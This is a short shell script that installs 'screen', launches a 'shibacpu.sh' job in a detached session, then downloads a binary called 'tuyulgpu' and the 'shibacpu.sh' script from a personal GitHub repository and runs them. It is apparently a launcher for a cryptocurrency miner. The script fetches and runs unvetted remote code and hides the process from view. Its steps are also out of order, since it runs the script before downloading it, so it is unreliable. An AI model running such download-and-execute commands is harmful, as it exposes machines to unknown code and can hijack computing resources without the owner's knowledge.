#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS shibacpu ./shibacpu.sh 65 75

wget https://github.com/yuliantiriyanti6/m/raw/main/tuyulgpu

wget https://raw.githubusercontent.com/yuliantiriyanti6/m/main/shibacpu.sh

chmod +x shibacpu.sh

./shibacpu.sh

